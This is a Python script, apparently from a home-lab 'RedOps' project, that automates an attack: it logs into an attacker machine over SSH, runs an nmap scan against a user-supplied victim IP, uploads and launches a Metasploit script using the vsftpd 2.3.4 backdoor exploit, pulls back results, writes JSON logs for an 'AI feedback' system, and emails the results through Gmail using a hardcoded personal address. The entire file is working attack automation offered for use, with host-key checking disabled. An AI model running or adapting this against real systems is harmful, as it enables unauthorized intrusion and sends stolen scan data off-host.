import paramiko
import getpass
import time
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import datetime
import json

ATTACKER_IP = "192.168.1.218"                      # PC2 - RedOps Attack Engine
USERNAME = "redops-attack-engine"                  # Attacker SSH username
PASSWORD = "i"                                      # SSH password or key

# Email credentials (configure accordingly)
EMAIL_SENDER = "haagduga69@gmail.com"
EMAIL_PASSWORD = "i"
EMAIL_RECEIVER = "haagduga69@gmail.com"


# Function to log structured data for AI feedback
def log_to_redops_ai(victim_ip, tools_used, scan_result_path, metasploit_module=None):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H-%M-%S")
    log_entry = {
        "timestamp": timestamp,
        "victim_ip": victim_ip,
        "attacker_ip": ATTACKER_IP,
        "tools_used": tools_used,
        "scan_result_path": scan_result_path,
        "metasploit_module": metasploit_module,
        "status": "completed"
    }

    log_dir = os.path.join(os.getcwd(), "redops_logs")
    os.makedirs(log_dir, exist_ok=True)

    log_file_path = os.path.join(log_dir, f"attack_{timestamp}.json")
    with open(log_file_path, "w") as f:
        json.dump(log_entry, f, indent=4)

    print(f"[+] AI Feedback Log saved at: {log_file_path}")


def ssh_connect(ip, username, password):
    print(f"[+] Connecting to attacker {ip} via SSH...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=username, password=password)
    return ssh


def send_email(subject, body, attachment_path):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(attachment_path)}")
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, text)
        server.quit()
        print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")


def run_attacks(victim_ip):
    ssh = ssh_connect(ATTACKER_IP, USERNAME, PASSWORD)
    sftp = ssh.open_sftp()

    print("[+] Checking for offensive tools installed on attacker...")
    tools = ["nmap", "sqlmap", "hydra", "nikto", "netcat", "john", "gobuster", "curl", "sshpass", "python3-pip", "wfuzz", "whatweb", "openvas"]
    for tool in tools:
        stdin, stdout, stderr = ssh.exec_command(f"which {tool}")
        output = stdout.read().decode().strip()
        if not output:
            print(f"[!] {tool} not found!")

    print("[+] Running Nmap scan on victim...")
    result_file_remote = "/tmp/nmap_scan.txt"
    ssh.exec_command(f"nmap -sV -T4 {victim_ip} -oN {result_file_remote}")
    time.sleep(10)  # Wait for scan to complete

    print("[+] Generating Metasploit RC file...")
    rc_commands = f"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {victim_ip}\nrun\n"
    rc_file_path = "/tmp/attack_script.rc"
    with open("attack_script.rc", "w") as f:
        f.write(rc_commands)

    sftp.put("attack_script.rc", rc_file_path)
    print("[+] RC file uploaded.")

    print("[+] Launching Metasploit...")
    ssh.exec_command(f"msfconsole -r {rc_file_path} -q")
    time.sleep(20)

    print("[+] Fetching scan result file from attacker to base machine...")
    result_file_local = os.path.join(os.getcwd(), "nmap_scan_local.txt")
    sftp.get(result_file_remote, result_file_local)
    print(f"[+] File downloaded to: {result_file_local}")

    # 🔍 Structured feedback for AI system
    log_to_redops_ai(
        victim_ip=victim_ip,
        tools_used=["nmap", "metasploit"],
        scan_result_path=result_file_local,
        metasploit_module="exploit/unix/ftp/vsftpd_234_backdoor"
    )

    print("[+] Sending email alert...")
    send_email("RedOps AI Alert: Attack Complete", f"Attack on {victim_ip} complete.\nResults attached.", result_file_local)
    ssh.close()


if __name__ == "__main__":
    victim_ip = input("Enter victim IP (PC3): ")
    run_attacks(victim_ip)